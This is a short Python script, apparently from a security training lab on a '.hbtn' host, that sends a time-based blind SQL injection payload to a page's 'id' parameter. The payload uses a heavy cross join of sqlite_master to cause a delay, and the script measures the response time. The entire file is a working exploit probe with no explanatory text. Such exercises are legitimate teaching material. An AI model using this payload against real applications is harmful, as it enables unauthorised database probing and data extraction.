#!/usr/bin/env/python3
import requests
import time

url = "http://web0x01.hbtn/a3/sql_injection/page.php"

payload = "1' AND (SELECT COUNT(*) FROM sqlite_master, sqlite_master, sqlite_master, sqlite_master, sqlite_master, sqlite_master, sqlite_master) > 0 --"

print("Sending payload...")
start = time.time()
response = requests.get(url, params={'id': payload}, timeout=15)
elapsed = time.time() - start

print(f"Response time: {elapsed:.2f} seconds")
print(f"Status code: {response.status_code}")
print(f"Response text (first 500 chars):")
print(response.text[:500])
